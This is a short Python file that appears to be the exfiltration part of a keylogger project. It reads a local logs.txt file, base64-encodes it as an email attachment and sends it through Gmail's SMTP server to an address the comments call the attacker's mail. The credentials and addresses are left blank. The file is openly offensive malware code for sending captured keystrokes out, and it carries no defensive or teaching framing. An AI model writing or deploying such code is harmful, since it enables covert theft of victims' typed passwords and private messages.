import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def email():
    msg = MIMEMultipart()
    msg['From'] = "" #store sender email
    msg['To'] = ""  #store reciever email
    #both sender and reciever email can be same i.e attacker's mail
    msg['Subject'] = "Key-Logger"
    body = " "
    msg.attach(MIMEText(body, 'plain'))
    filename = "logs.txt"
    attachment = open("C:\\Users\\abhij\\PycharmProjects\\KeyLogger\\logs.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    username="" #email_name
    password="" #email_password
    s.login(username, password)
    text = msg.as_string()
    s.sendmail("", "", text)
    s.quit()